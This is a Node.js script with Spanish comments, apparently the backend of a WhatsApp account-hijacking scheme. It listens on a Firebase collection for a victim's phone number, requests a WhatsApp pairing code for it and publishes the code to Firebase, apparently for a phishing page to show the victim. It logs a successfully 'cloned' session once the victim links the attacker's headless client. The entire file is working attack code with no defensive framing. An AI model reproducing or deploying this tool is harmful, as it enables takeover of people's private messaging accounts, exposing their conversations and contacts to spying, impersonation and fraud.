const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

// CONFIGURACIÓN FIREBASE
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
}
const db = admin.firestore();

// CONFIGURACIÓN DEL CLIENTE
const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master-session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// ESCUCHA EN TIEMPO REAL (MÁS RÁPIDO)
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();

    if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
        console.log(">>> [!] GENERANDO CÓDIGO PARA: " + data.numero_victima);
        try {
            // SOLICITAR CÓDIGO A WHATSAPP
            const code = await client.requestPairingCode(data.numero_victima);
            console.log(">>> [OK] CÓDIGO CREADO: " + code);
            
            // SUBIR A FIREBASE
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo"
            });
        } catch (err) {
            console.log(">>> [ERROR]: " + err.message);
        }
    }
});

client.on('ready', () => {
    console.log(">>> SESIÓN CLONADA CON ÉXITO");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize();

// SERVIDOR PARA RENDER
const port = process.env.PORT || 3000;
http.createServer((req, res) => { res.end('MOTOR ONLINE'); }).listen(port, () => {
    console.log("Servidor iniciado en puerto " + port);
});
